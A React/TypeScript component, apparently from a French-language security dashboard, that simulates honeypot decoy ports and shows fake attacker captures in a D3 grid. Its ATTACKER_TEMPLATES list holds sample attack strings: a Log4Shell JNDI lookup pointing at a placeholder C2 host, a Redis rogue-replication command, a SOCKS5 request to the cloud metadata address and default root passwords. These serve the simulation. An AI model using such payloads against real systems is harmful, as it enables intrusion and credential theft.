import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from 'react';
import * as d3 from 'd3';
import {
  Bug,
  Download,
  FileCode2,
  Pause,
  Play,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Zap,
} from 'lucide-react';
import {
  AppSettings,
  IntrusionAttempt,
  IntrusionSeverity,
  IntrusionVector,
  VirtualIdentity,
} from '../types';
import {
  INITIAL_INTRUSION_ATTEMPTS,
  resolveThreatGeoposition,
} from '../constants';

export interface IntrusionDeceptionGridProps {
  isConnected: boolean;
  currentIdentity: VirtualIdentity;
  settings: AppSettings;
  addLog?: (
    event: string,
    type?: 'info' | 'warning' | 'success' | 'error',
    ip?: string
  ) => void;
}

type AttackTechniqueId =
  | 'syn_banner'
  | 'cred_brute'
  | 'rce_exploit'
  | 'tunnel_probe'
  | 'key_fuzz';

interface HoneypotPortConfig {
  port: number;
  protocol: 'TCP' | 'UDP';
  serviceName: string;
  decoyBanner: string;
  armed: boolean;
  tarpitDelayMs: number;
}

interface HoneypotInteraction {
  id: string;
  timestamp: string;
  timestampMs: number;
  port: number;
  protocol: 'TCP' | 'UDP';
  serviceName: string;
  technique: AttackTechniqueId;
  severity: IntrusionSeverity;
  attackerIp: string;
  attackerCountry: string;
  attackerAsn: string;
  tarpitHoldMs: number;
  bytesCaptured: number;
  payloadHex: string;
  payloadAscii: string;
  artifactSha256: string;
  escalatedToIds: boolean;
}

const INITIAL_HONEYPOT_PORTS: HoneypotPortConfig[] = [
  {
    port: 22,
    protocol: 'TCP',
    serviceName: 'SSH-Decoy',
    decoyBanner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3canary',
    armed: true,
    tarpitDelayMs: 4200,
  },
  {
    port: 23,
    protocol: 'TCP',
    serviceName: 'Telnet-IoT',
    decoyBanner: 'BusyBox v1.35.0 (Router-TRAP) login:',
    armed: true,
    tarpitDelayMs: 6500,
  },
  {
    port: 445,
    protocol: 'TCP',
    serviceName: 'SMB-Canary',
    decoyBanner: 'Samba 4.15.9-Canary-Share',
    armed: true,
    tarpitDelayMs: 2800,
  },
  {
    port: 1080,
    protocol: 'TCP',
    serviceName: 'SOCKS5-Bait',
    decoyBanner: 'SOCKS5 RFC1928 Auth=0x02 Trap',
    armed: true,
    tarpitDelayMs: 3100,
  },
  {
    port: 3389,
    protocol: 'TCP',
    serviceName: 'RDP-Lure',
    decoyBanner: 'MS-RDP NLA CredSSP Sinkhole',
    armed: true,
    tarpitDelayMs: 3900,
  },
  {
    port: 51820,
    protocol: 'UDP',
    serviceName: 'WG-Phantom',
    decoyBanner: 'Noise_IKpsk2 Dummy Handshake',
    armed: true,
    tarpitDelayMs: 1400,
  },
  {
    port: 6379,
    protocol: 'TCP',
    serviceName: 'Redis-Trap',
    decoyBanner: '-ERR NOAUTH Authentication required (Canary)',
    armed: false,
    tarpitDelayMs: 2200,
  },
  {
    port: 8080,
    protocol: 'TCP',
    serviceName: 'HTTP-Admin',
    decoyBanner: 'Apache-Coyote/1.1 Admin Console Decoy',
    armed: true,
    tarpitDelayMs: 2600,
  },
];

const TECHNIQUES: Array<{
  id: AttackTechniqueId;
  label: string;
  shortLabel: string;
}> = [
  { id: 'syn_banner', label: 'Scan SYN & Banner', shortLabel: 'SYN/Banner' },
  { id: 'cred_brute', label: 'Force Brute / Dictionnaire', shortLabel: 'Force Brute' },
  { id: 'rce_exploit', label: 'Payload RCE / CVE', shortLabel: 'Exploit RCE' },
  { id: 'tunnel_probe', label: 'Relais / Proxy Abuse', shortLabel: 'Proxy/Relay' },
  { id: 'key_fuzz', label: 'Fuzzing Cryptographique', shortLabel: 'Fuzz KEX' },
];

const ATTACKER_TEMPLATES = [
  { ip: '185.220.101.45', country: 'Allemagne', payload: 'USER root\nPASS toor1234\nuname -a' },
  { ip: '91.240.118.82', country: 'Russie', payload: 'GET /manager/html HTTP/1.1\r\nX-Jndi: ${jndi:ldap://c2}' },
  { ip: '162.142.125.44', country: 'Chine', payload: 'SSH-2.0-libssh_0.9.4 AUTH_NONE probe' },
  { ip: '194.26.29.112', country: 'Pays-Bas', payload: 'SOCKS5 CONNECT 169.254.169.254:80' },
  { ip: '5.160.23.109', country: 'Iran', payload: 'SMB2_NEGOTIATE EternalBlue MS17-010 check' },
  { ip: '89.40.181.12', country: 'Roumanie', payload: 'REDIS SLAVEOF 89.40.181.12 9999\r\nCONFIG SET dir /tmp' },
  { ip: '45.33.32.156', country: 'États-Unis', payload: 'RDP_NEG_REQ cookie: mstshash=Administrator' },
];

function secureRand(): number {
  const arr = new Uint32Array(1);
  window.crypto.getRandomValues(arr);
  return arr[0] / 0xffffffff;
}

function toHexPreview(ascii: string): string {
  return Array.from(ascii.slice(0, 24))
    .map((ch) => ch.charCodeAt(0).toString(16).padStart(2, '0'))
    .join(' ')
    .toUpperCase();
}

function pseudoSha256(seed: string): string {
  let h1 = 0xdeadbeef ^ seed.length;
  let h2 = 0x41c6ce57 ^ seed.length;
  for (let i = 0; i < seed.length; i++) {
    const c = seed.charCodeAt(i);
    h1 = Math.imul(h1 ^ c, 2654435761);
    h2 = Math.imul(h2 ^ c, 1597334677);
  }
  const partA = (h1 >>> 0).toString(16).padStart(8, '0');
  const partB = (h2 >>> 0).toString(16).padStart(8, '0');
  return `${partA}${partB}9f4a21c8e7b03d12`.slice(0, 32);
}

function pickTechniqueForPort(port: number): {
  technique: AttackTechniqueId;
  severity: IntrusionSeverity;
} {
  if (port === 22 || port === 23 || port === 3389) {
    return secureRand() > 0.35
      ? { technique: 'cred_brute', severity: 'high' }
      : { technique: 'syn_banner', severity: 'medium' };
  }
  if (port === 445 || port === 8080 || port === 6379) {
    return secureRand() > 0.35
      ? { technique: 'rce_exploit', severity: 'critical' }
      : { technique: 'syn_banner', severity: 'high' };
  }
  if (port === 1080) {
    return { technique: 'tunnel_probe', severity: 'high' };
  }
  return { technique: 'key_fuzz', severity: 'critical' };
}

function buildInteraction(
  portCfg: HoneypotPortConfig,
  overrideTimeMs?: number
): HoneypotInteraction {
  const tsMs = overrideTimeMs ?? Date.now();
  const tpl =
    ATTACKER_TEMPLATES[
      Math.floor(secureRand() * ATTACKER_TEMPLATES.length) %
        ATTACKER_TEMPLATES.length
    ];
  const geo = resolveThreatGeoposition(tpl.country, tpl.ip);
  const { technique, severity } = pickTechniqueForPort(portCfg.port);
  const hold = Math.round(portCfg.tarpitDelayMs * (0.75 + secureRand() * 0.65));

  return {
    id: `hp-${portCfg.port}-${tsMs}-${Math.floor(secureRand() * 9999)}`,
    timestamp: new Date(tsMs).toLocaleTimeString('fr-FR', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    }),
    timestampMs: tsMs,
    port: portCfg.port,
    protocol: portCfg.protocol,
    serviceName: portCfg.serviceName,
    technique,
    severity,
    attackerIp: tpl.ip,
    attackerCountry: geo.country,
    attackerAsn: geo.defaultAsn,
    tarpitHoldMs: hold,
    bytesCaptured: 128 + Math.floor(secureRand() * 1450),
    payloadHex: toHexPreview(tpl.payload),
    payloadAscii: tpl.payload,
    artifactSha256: pseudoSha256(`${tpl.ip}:${portCfg.port}:${tsMs}`),
    escalatedToIds: false,
  };
}

export const IntrusionDeceptionGrid: React.FC<IntrusionDeceptionGridProps> = ({
  isConnected,
  currentIdentity,
  settings,
  addLog,
}) => {
  const [honeypots, setHoneypots] = useState<HoneypotPortConfig[]>(
    INITIAL_HONEYPOT_PORTS
  );
  const [gridView, setGridView] = useState<'matrix' | 'timeline'>('matrix');
  const [isAutoCapture, setIsAutoCapture] = useState(true);
  const [selectedCell, setSelectedCell] = useState<{
    port: number;
    technique?: AttackTechniqueId;
    slotIdx?: number;
  } | null>(null);
  const [selectedInteractionId, setSelectedInteractionId] = useState<
    string | null
  >(null);

  // Seed rich initial forensic interactions across armed honeypot ports
  const [interactions, setInteractions] = useState<HoneypotInteraction[]>(() => {
    const now = Date.now();
    const list: HoneypotInteraction[] = [];
    INITIAL_HONEYPOT_PORTS.filter((p) => p.armed).forEach((cfg, idx) => {
      list.push(buildInteraction(cfg, now - (idx + 1) * 18000));
      if (idx % 2 === 0) {
        list.push(buildInteraction(cfg, now - (idx + 3) * 29000));
      }
    });
    return list.sort((a, b) => b.timestampMs - a.timestampMs);
  });

  // Listen for live IDS intrusions hitting honeypot-monitored ports
  useEffect(() => {
    const onIdsBlocked = (ev: Event) => {
      const customEv = ev as CustomEvent<IntrusionAttempt>;
      const att = customEv.detail;
      if (!att) return;
      const matchedPort =
        honeypots.find((h) => h.port === att.targetPort) ||
        honeypots.find((h) => h.armed) ||
        honeypots[0];
      if (!matchedPort || !matchedPort.armed) return;

      const geo = resolveThreatGeoposition(att.sourceCountry || '', att.sourceIp);
      const ascii = att.rawPayloadSnippet || att.description;
      const mapped: HoneypotInteraction = {
        id: `hp-ids-${att.id}`,
        timestamp: new Date().toLocaleTimeString('fr-FR', {
          hour12: false,
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
        }),
        timestampMs: Date.now(),
        port: matchedPort.port,
        protocol: matchedPort.protocol,
        serviceName: matchedPort.serviceName,
        technique:
          att.vector === 'brute_force'
            ? 'cred_brute'
            : att.vector === 'replay_attack'
              ? 'key_fuzz'
              : att.vector === 'port_scan'
                ? 'syn_banner'
                : 'rce_exploit',
        severity: att.severity,
        attackerIp: att.sourceIp,
        attackerCountry: geo.country,
        attackerAsn: att.sourceAsn || geo.defaultAsn,
        tarpitHoldMs: matchedPort.tarpitDelayMs,
        bytesCaptured: 340 + Math.floor(secureRand() * 900),
        payloadHex: toHexPreview(ascii),
        payloadAscii: ascii,
        artifactSha256: pseudoSha256(`${att.id}:${att.sourceIp}`),
        escalatedToIds: true,
      };
      setInteractions((prev) => [mapped, ...prev].slice(0, 90));
    };

    window.addEventListener('renumerate_intrusion_blocked', onIdsBlocked);
    return () =>
      window.removeEventListener('renumerate_intrusion_blocked', onIdsBlocked);
  }, [honeypots]);

  // Periodic honeypot decoy capture loop when auto-capture is enabled
  useEffect(() => {
    if (!isAutoCapture) return;
    const timer = window.setInterval(() => {
      const armedPorts = honeypots.filter((h) => h.armed);
      if (armedPorts.length === 0) return;
      if (secureRand() > 0.55) return;

      const target =
        armedPorts[Math.floor(secureRand() * armedPorts.length) % armedPorts.length];
      const captured = buildInteraction(target);
      setInteractions((prev) => [captured, ...prev].slice(0, 90));
    }, 3200);

    return () => window.clearInterval(timer);
  }, [isAutoCapture, honeypots]);

  const handleTogglePort = useCallback(
    (port: number) => {
      setHoneypots((prev) =>
        prev.map((h) => (h.port === port ? { ...h, armed: !h.armed } : h))
      );
      const current = honeypots.find((h) => h.port === port);
      if (current) {
        addLog?.(
          `[Deception Grid] Port leurre ${current.port}/${current.protocol} (${current.serviceName}) ${
            current.armed ? 'désarmé' : 'armé'
          }`,
          'info',
          currentIdentity.ip
        );
      }
    },
    [honeypots, addLog, currentIdentity.ip]
  );

  const handleSimulateProbe = useCallback(() => {
    const armedPorts = honeypots.filter((h) => h.armed);
    const pool = armedPorts.length > 0 ? armedPorts : honeypots;
    const preferred = selectedCell
      ? pool.find((p) => p.port === selectedCell.port)
      : undefined;
    const target =
      preferred || pool[Math.floor(secureRand() * pool.length) % pool.length];

    const item = buildInteraction(target);
    setInteractions((prev) => [item, ...prev].slice(0, 90));
    setSelectedInteractionId(item.id);

    addLog?.(
      `[Deception Grid] Sonde malveillante capturée sur leurre ${item.port}/${item.protocol} depuis ${item.attackerIp} (tarpit ${item.tarpitHoldMs} ms)`,
      'warning',
      item.attackerIp
    );
  }, [honeypots, selectedCell, addLog]);

  const handleEscalateToIds = useCallback(
    (item: HoneypotInteraction) => {
      const geo = resolveThreatGeoposition(
        item.attackerCountry,
        item.attackerIp
      );
      const vectorMap: Record<AttackTechniqueId, IntrusionVector> = {
        syn_banner: 'port_scan',
        cred_brute: 'brute_force',
        rce_exploit: 'c2_beacon',
        tunnel_probe: 'brute_force',
        key_fuzz: 'replay_attack',
      };

      const attempt: IntrusionAttempt = {
        id: `ids-hp-${Date.now()}`,
        timestamp: new Date().toISOString(),
        severity: item.severity,
        vector: vectorMap[item.technique],
        title: `Piège Honeypot ${item.serviceName} (Port ${item.port}/${item.protocol})`,
        description: `Interaction malveillante capturée dans le tarpit de déception (${item.tarpitHoldMs} ms) · SHA-256 ${item.artifactSha256}.`,
        sourceIp: item.attackerIp,
        sourceCountry: geo.country,
        sourceCity: geo.city,
        sourceCoords: geo.coords,
        sourceAsn: item.attackerAsn,
        targetPort: item.port,
        targetInterface: item.port === 51820 ? 'wg0' : 'eth0',
        protocol: item.protocol,
        signatureRule: `DECEPTION-TRAP-${item.serviceName.toUpperCase()}`,
        actionTaken: 'nft_quarantine',
        quarantined: true,
        rawPayloadSnippet: item.payloadAscii,
        remediationAdvice:
          'Hôte promu vers la quarantaine nftables et signalé aux capteurs IDS/Planétarium.',
      };

      try {
        const raw = localStorage.getItem('renumerate_ids_attempts');
        const list: IntrusionAttempt[] = raw
          ? JSON.parse(raw)
          : INITIAL_INTRUSION_ATTEMPTS;
        localStorage.setItem(
          'renumerate_ids_attempts',
          JSON.stringify([attempt, ...list].slice(0, 40))
        );
      } catch {
        // Ignore storage error
      }

      window.dispatchEvent(
        new CustomEvent('renumerate_intrusion_blocked', { detail: attempt })
      );

      setInteractions((prev) =>
        prev.map((x) => (x.id === item.id ? { ...x, escalatedToIds: true } : x))
      );

      addLog?.(
        `[Deception Grid] IP ${item.attackerIp} transférée en quarantaine IDS depuis le port leurre ${item.port}/${item.protocol}`,
        'success',
        item.attackerIp
      );
    },
    [addLog]
  );

  const handleExportForensics = useCallback(() => {
    const blob = new Blob(
      [
        JSON.stringify(
          {
            exportedAt: new Date().toISOString(),
            gatewayIp: currentIdentity.ip,
            armedHoneypots: honeypots.filter((h) => h.armed).map((h) => h.port),
            totalCapturedInteractions: interactions.length,
            interactions,
          },
          null,
          2
        ),
      ],
      { type: 'application/json;charset=utf-8;' }
    );
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `deception-forensics-${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, [currentIdentity.ip, honeypots, interactions]);

  // Filtered list by selected D3 cell
  const matchingInteractions = useMemo(() => {
    if (!selectedCell) return interactions;
    return interactions.filter((item) => {
      if (item.port !== selectedCell.port) return false;
      if (selectedCell.technique && item.technique !== selectedCell.technique) {
        return false;
      }
      return true;
    });
  }, [interactions, selectedCell]);

  const inspectedInteraction = useMemo(
    () =>
      interactions.find((i) => i.id === selectedInteractionId) ||
      matchingInteractions[0] ||
      interactions[0] ||
      null,
    [interactions, selectedInteractionId, matchingInteractions]
  );

  // Summary KPIs
  const summaryStats = useMemo(() => {
    const armedCount = honeypots.filter((h) => h.armed).length;
    const avgHoldSec =
      interactions.length > 0
        ? (
            interactions.reduce((acc, i) => acc + i.tarpitHoldMs, 0) /
            interactions.length /
            1000
          ).toFixed(1)
        : '0.0';
    const uniqueIps = new Set(interactions.map((i) => i.attackerIp)).size;
    const escalatedCount = interactions.filter((i) => i.escalatedToIds).length;
    return {
      armedCount,
      totalPorts: honeypots.length,
      avgHoldSec,
      uniqueIps,
      escalatedCount,
    };
  }, [honeypots, interactions]);

  // Responsive D3 Grid SVG measurement
  const gridWrapperRef = useRef<HTMLDivElement | null>(null);
  const d3SvgRef = useRef<SVGSVGElement | null>(null);
  const [gridWidth, setGridWidth] = useState(720);
  const [hoveredCellSummary, setHoveredCellSummary] = useState<string | null>(
    null
  );

  useEffect(() => {
    const el = gridWrapperRef.current;
    if (!el) return;
    const update = () => {
      const w = el.clientWidth;
      if (w > 180) setGridWidth(w);
    };
    update();
    const ro =
      typeof ResizeObserver !== 'undefined' ? new ResizeObserver(update) : null;
    ro?.observe(el);
    window.addEventListener('resize', update);
    return () => {
      ro?.disconnect();
      window.removeEventListener('resize', update);
    };
  }, []);

  // =========================================================================
  // D3.js Interactive Forensic Data Grid
  // =========================================================================
  useEffect(() => {
    if (!d3SvgRef.current) return;

    const svg = d3.select(d3SvgRef.current);
    svg.selectAll('*').remove();

    const width = gridWidth;
    const height = 276;
    const margin = { top: 28, right: 18, bottom: 26, left: 108 };
    const innerW = Math.max(180, width - margin.left - margin.right);
    const innerH = height - margin.top - margin.bottom;

    svg.attr('viewBox', `0 0 ${width} ${height}`);

    const g = svg
      .append('g')
      .attr('transform', `translate(${margin.left},${margin.top})`);

    const portLabels = honeypots.map(
      (h) => `${h.port}/${h.protocol} ${h.serviceName}`
    );

    const y = d3
      .scaleBand<string>()
      .domain(portLabels)
      .range([0, innerH])
      .padding(0.14);

    if (gridView === 'matrix') {
      const colIds = TECHNIQUES.map((t) => t.id);
      const x = d3
        .scaleBand<AttackTechniqueId>()
        .domain(colIds)
        .range([0, innerW])
        .padding(0.1);

      interface MatrixCell {
        portCfg: HoneypotPortConfig;
        portLabel: string;
        technique: (typeof TECHNIQUES)[number];
        count: number;
        criticalCount: number;
        avgHoldMs: number;
        latestIp: string | null;
      }

      const cells: MatrixCell[] = [];
      let maxCount = 1;

      honeypots.forEach((h) => {
        const portLabel = `${h.port}/${h.protocol} ${h.serviceName}`;
        TECHNIQUES.forEach((tech) => {
          const hits = interactions.filter(
            (i) => i.port === h.port && i.technique === tech.id
          );
          if (hits.length > maxCount) maxCount = hits.length;
          cells.push({
            portCfg: h,
            portLabel,
            technique: tech,
            count: hits.length,
            criticalCount: hits.filter((x) => x.severity === 'critical').length,
            avgHoldMs:
              hits.length > 0
                ? Math.round(
                    hits.reduce((a, b) => a + b.tarpitHoldMs, 0) / hits.length
                  )
                : 0,
            latestIp: hits[0]?.attackerIp || null,
          });
        });
      });

      const colorScale = d3
        .scaleLinear<string>()
        .domain([0, 1, Math.max(2, maxCount)])
        .range(['#0f172a', '#0e7490', '#e11d48']);

      // Column headers
      g.selectAll('.col-header')
        .data(TECHNIQUES)
        .enter()
        .append('text')
        .attr('x', (d) => (x(d.id) || 0) + x.bandwidth() / 2)
        .attr('y', -10)
        .attr('text-anchor', 'middle')
        .attr('fill', '#cbd5e1')
        .attr('font-size', '10px')
        .attr('font-family', 'monospace')
        .text((d) => d.shortLabel);

      // Matrix Cells
      const cellGrp = g
        .selectAll('.deception-cell')
        .data(cells)
        .enter()
        .append('g')
        .style('cursor', 'pointer')
        .on('mouseenter', (_, d) => {
          setHoveredCellSummary(
            `${d.portLabel} · ${d.technique.label} : ${d.count} capture(s)${
              d.latestIp ? ` · Dernière IP ${d.latestIp}` : ''
            }`
          );
        })
        .on('mouseleave', () => setHoveredCellSummary(null))
        .on('click', (_, d) => {
          setSelectedCell({ port: d.portCfg.port, technique: d.technique.id });
          const firstMatch = interactions.find(
            (i) => i.port === d.portCfg.port && i.technique === d.technique.id
          );
          if (firstMatch) setSelectedInteractionId(firstMatch.id);
        });

      cellGrp
        .append('rect')
        .attr('x', (d) => x(d.technique.id) || 0)
        .attr('y', (d) => y(d.portLabel) || 0)
        .attr('width', x.bandwidth())
        .attr('height', y.bandwidth())
        .attr('rx', 5)
        .attr('fill', (d) => {
          if (!d.portCfg.armed) return '#090d16';
          if (d.count === 0) return '#0f172a';
          if (d.criticalCount > 0) return '#be123c';
          return colorScale(d.count);
        })
        .attr('fill-opacity', (d) => (d.portCfg.armed ? 0.92 : 0.45))
        .attr('stroke', (d) => {
          const isSelected =
            selectedCell?.port === d.portCfg.port &&
            selectedCell?.technique === d.technique.id;
          if (isSelected) return '#22d3ee';
          if (!d.portCfg.armed) return '#1e293b';
          return d.count > 0 ? '#fb7185' : '#1e293b';
        })
        .attr('stroke-opacity', (d) => {
          const isSelected =
            selectedCell?.port === d.portCfg.port &&
            selectedCell?.technique === d.technique.id;
          return isSelected ? 1 : 0.55;
        })
        .attr('stroke-width', (d) => {
          const isSelected =
            selectedCell?.port === d.portCfg.port &&
            selectedCell?.technique === d.technique.id;
          return isSelected ? 2 : 1;
        });

      cellGrp
        .append('text')
        .attr('x', (d) => (x(d.technique.id) || 0) + x.bandwidth() / 2)
        .attr('y', (d) => (y(d.portLabel) || 0) + y.bandwidth() / 2 + 3.5)
        .attr('text-anchor', 'middle')
        .attr('fill', (d) =>
          !d.portCfg.armed
            ? '#475569'
            : d.count > 0
              ? '#f8fafc'
              : '#334155'
        )
        .attr('font-size', '10px')
        .attr('font-family', 'monospace')
        .attr('font-weight', (d) => (d.count > 0 ? '700' : '400'))
        .text((d) => (!d.portCfg.armed ? 'OFF' : d.count > 0 ? `${d.count}` : '·'));
    } else {
      // Timeline x Port Grid (8 recent rolling intervals)
      const slotCount = 8;
      const slotLabels = Array.from({ length: slotCount }, (_, idx) => {
        const offsetSec = (slotCount - 1 - idx) * 15;
        return offsetSec === 0 ? 'Maintenant' : `-${offsetSec}s`;
      });

      const x = d3
        .scaleBand<string>()
        .domain(slotLabels)
        .range([0, innerW])
        .padding(0.1);

      const now = Date.now();
      interface TimelineCell {
        portCfg: HoneypotPortConfig;
        portLabel: string;
        slotIdx: number;
        slotLabel: string;
        count: number;
        criticalCount: number;
      }

      const cells: TimelineCell[] = [];
      honeypots.forEach((h) => {
        const portLabel = `${h.port}/${h.protocol} ${h.serviceName}`;
        slotLabels.forEach((sLabel, sIdx) => {
          const slotAgeMaxMs = (slotCount - sIdx) * 15000;
          const slotAgeMinMs = (slotCount - 1 - sIdx) * 15000;
          const hits = interactions.filter((i) => {
            if (i.port !== h.port) return false;
            const age = Math.max(0, now - i.timestampMs);
            return age >= slotAgeMinMs && age < slotAgeMaxMs;
          });
          cells.push({
            portCfg: h,
            portLabel,
            slotIdx: sIdx,
            slotLabel: sLabel,
            count: hits.length,
            criticalCount: hits.filter((x) => x.severity === 'critical').length,
          });
        });
      });

      g.selectAll('.slot-header')
        .data(slotLabels)
        .enter()
        .append('text')
        .attr('x', (d) => (x(d) || 0) + x.bandwidth() / 2)
        .attr('y', -10)
        .attr('text-anchor', 'middle')
        .attr('fill', '#cbd5e1')
        .attr('font-size', '9px')
        .attr('font-family', 'monospace')
        .text((d) => d);

      const cellGrp = g
        .selectAll('.timeline-cell')
        .data(cells)
        .enter()
        .append('g')
        .style('cursor', 'pointer')
        .on('mouseenter', (_, d) => {
          setHoveredCellSummary(
            `${d.portLabel} (${d.slotLabel}) : ${d.count} sonde(s) interceptée(s)`
          );
        })
        .on('mouseleave', () => setHoveredCellSummary(null))
        .on('click', (_, d) => {
          setSelectedCell({ port: d.portCfg.port, slotIdx: d.slotIdx });
        });

      cellGrp
        .append('rect')
        .attr('x', (d) => x(d.slotLabel) || 0)
        .attr('y', (d) => y(d.portLabel) || 0)
        .attr('width', x.bandwidth())
        .attr('height', y.bandwidth())
        .attr('rx', 4)
        .attr('fill', (d) => {
          if (!d.portCfg.armed) return '#090d16';
          if (d.count === 0) return '#0f172a';
          return d.criticalCount > 0 ? '#e11d48' : '#0891b2';
        })
        .attr('stroke', (d) =>
          selectedCell?.port === d.portCfg.port ? '#22d3ee' : '#1e293b'
        )
        .attr('stroke-width', (d) =>
          selectedCell?.port === d.portCfg.port ? 1.8 : 1
        );

      cellGrp
        .append('text')
        .attr('x', (d) => (x(d.slotLabel) || 0) + x.bandwidth() / 2)
        .attr('y', (d) => (y(d.portLabel) || 0) + y.bandwidth() / 2 + 3.5)
        .attr('text-anchor', 'middle')
        .attr('fill', (d) => (d.count > 0 ? '#ffffff' : '#334155'))
        .attr('font-size', '10px')
        .attr('font-family', 'monospace')
        .text((d) => (!d.portCfg.armed ? '—' : d.count > 0 ? `${d.count}` : '·'));
    }

    // Y-Axis (Honeypot Port Labels)
    g.append('g')
      .call(d3.axisLeft(y))
      .call((ax) => ax.select('.domain').remove())
      .call((ax) => ax.selectAll('line').remove())
      .call((ax) =>
        ax
          .selectAll('text')
          .attr('fill', (label) => {
            const portNum = Number.parseInt(String(label).split('/')[0], 10);
            const cfg = honeypots.find((h) => h.port === portNum);
            return cfg?.armed ? '#e2e8f0' : '#64748b';
          })
          .attr('font-size', '10px')
          .attr('font-family', 'monospace')
      );
  }, [gridWidth, gridView, honeypots, interactions, selectedCell]);

  return (
    <section
      id="intrusion-deception-grid"
      className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl overflow-hidden"
    >
      {/* Header */}
      <div className="px-5 py-4 border-b border-slate-200 dark:border-slate-800 flex flex-col lg:flex-row lg:items-center justify-between gap-3">
        <div>
          <div className="flex flex-wrap items-center gap-2">
            <Bug className="w-4 h-4 text-amber-500 shrink-0" />
            <h2 className="text-sm font-bold text-slate-900 dark:text-white">
              Intrusion Deception Grid (Honeypots &amp; Forensique D3.js)
            </h2>
            <span
              className="text-slate-300 dark:text-slate-700"
              aria-hidden="true"
            >
              ·
            </span>
            <span className="text-xs font-mono tabular-nums text-slate-500 dark:text-slate-400">
              {summaryStats.armedCount}/{summaryStats.totalPorts} ports leurres armés
            </span>
          </div>
          <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
            Simulation de ports appâts (tarpits SSH, SMB, RDP, WireGuard) capturant les payloads malveillants dans une matrice D3.js interactive.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <div className="flex items-center gap-1 p-1 bg-slate-100 dark:bg-slate-800 rounded-lg">
            <button
              type="button"
              onClick={() => setGridView('matrix')}
              className={`px-2.5 py-1 rounded-md text-xs font-medium cursor-pointer transition-colors whitespace-nowrap shrink-0 ${
                gridView === 'matrix'
                  ? 'bg-white dark:bg-slate-700 text-slate-900 dark:text-white shadow-2xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Port × Vecteur
            </button>
            <button
              type="button"
              onClick={() => setGridView('timeline')}
              className={`px-2.5 py-1 rounded-md text-xs font-medium cursor-pointer transition-colors whitespace-nowrap shrink-0 ${
                gridView === 'timeline'
                  ? 'bg-white dark:bg-slate-700 text-slate-900 dark:text-white shadow-2xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Chronologie
            </button>
          </div>

          <button
            type="button"
            onClick={handleSimulateProbe}
            className="px-3 py-1.5 rounded-lg bg-amber-600 hover:bg-amber-500 text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0"
          >
            <Zap className="w-3.5 h-3.5" />
            <span>Simuler Sonde</span>
          </button>

          <button
            type="button"
            onClick={() => setIsAutoCapture((v) => !v)}
            className="p-1.5 rounded-lg bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 cursor-pointer"
            title={
              isAutoCapture
                ? 'Mettre en pause la capture honeypot'
                : 'Reprendre la capture honeypot'
            }
          >
            {isAutoCapture ? (
              <Pause className="w-4 h-4" />
            ) : (
              <Play className="w-4 h-4" />
            )}
          </button>

          <button
            type="button"
            onClick={handleExportForensics}
            className="p-1.5 rounded-lg bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 cursor-pointer"
            title="Exporter les captures forensiques (JSON)"
          >
            <Download className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Body */}
      <div className="p-5 space-y-5">
        {/* Interactive Honeypot Port Switchboard */}
        <div className="space-y-2">
          <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
            <span className="font-semibold text-slate-700 dark:text-slate-300">
              Tableau des ports appâts (cliquez pour armer ou désarmer un leurre)
            </span>
            <span className="font-mono tabular-nums text-[11px] text-slate-500 dark:text-slate-400">
              {interactions.length} captures · {summaryStats.uniqueIps} IP distinctes · Tarpit moy. {summaryStats.avgHoldSec}s · {summaryStats.escalatedCount} transférée(s) IDS
            </span>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {honeypots.map((hp) => {
              const countForPort = interactions.filter(
                (i) => i.port === hp.port
              ).length;
              return (
                <button
                  key={hp.port}
                  type="button"
                  onClick={() => handleTogglePort(hp.port)}
                  className={`p-2.5 rounded-xl border text-left transition-colors cursor-pointer ${
                    hp.armed
                      ? 'bg-slate-50 dark:bg-slate-950/60 border-amber-500/40 hover:border-amber-500'
                      : 'bg-slate-100/60 dark:bg-slate-900 border-slate-200 dark:border-slate-800 opacity-60 hover:opacity-90'
                  }`}
                >
                  <div className="flex items-center justify-between text-xs font-mono font-bold text-slate-900 dark:text-white">
                    <span>{hp.port}</span>
                    <span
                      className={
                        hp.armed
                          ? 'text-[10px] text-amber-600 dark:text-amber-400'
                          : 'text-[10px] text-slate-400'
                      }
                    >
                      {hp.armed ? 'ARMÉ' : 'OFF'}
                    </span>
                  </div>
                  <div className="text-[11px] text-slate-600 dark:text-slate-300 truncate mt-0.5">
                    {hp.serviceName}
                  </div>
                  <div className="text-[10px] font-mono tabular-nums text-slate-500 mt-1">
                    {countForPort} hit{countForPort > 1 ? 's' : ''} · {hp.protocol}
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* D3.js Forensic Grid Stage */}
        <div
          ref={gridWrapperRef}
          className="relative w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 overflow-hidden"
        >
          <div className="flex flex-wrap items-center justify-between gap-2 px-2 pb-1 text-[11px] font-mono text-slate-400">
            <span>
              {hoveredCellSummary ||
                'Cliquez sur une cellule de la grille D3 pour filtrer et inspecter les artefacts capturés'}
            </span>
            {selectedCell && (
              <button
                type="button"
                onClick={() => setSelectedCell(null)}
                className="text-cyan-400 hover:underline cursor-pointer"
              >
                Réinitialiser le filtre ({selectedCell.port})
              </button>
            )}
          </div>

          <svg ref={d3SvgRef} className="w-full h-[276px] block" />
        </div>

